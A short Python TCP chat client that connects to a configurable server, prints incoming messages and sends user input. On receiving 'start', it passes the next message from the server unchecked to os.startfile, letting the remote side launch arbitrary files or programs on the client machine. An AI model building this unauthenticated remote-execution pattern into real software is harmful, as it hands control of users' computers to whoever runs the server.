import socket
import threading
import os

HOST = '' # Replace with the IP address of the server
PORT = 12345

def receive_messages(sock):
    start_flag = False
    while True:
        data = sock.recv(1024)
        message = data.decode('utf-8')
        print(f'Received message: {message} ')
        if start_flag:
            os.startfile(message)
            start_flag = False
        elif message == 'start':
            start_flag = True

def start_client():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print(f'Connected to {HOST}:{PORT}')

    thread = threading.Thread(target=receive_messages, args=(sock,))
    thread.daemon = True
    thread.start()

    while True:
        message = input('> ')
        if message:
            sock.sendall(message.encode('utf-8'))

start_client()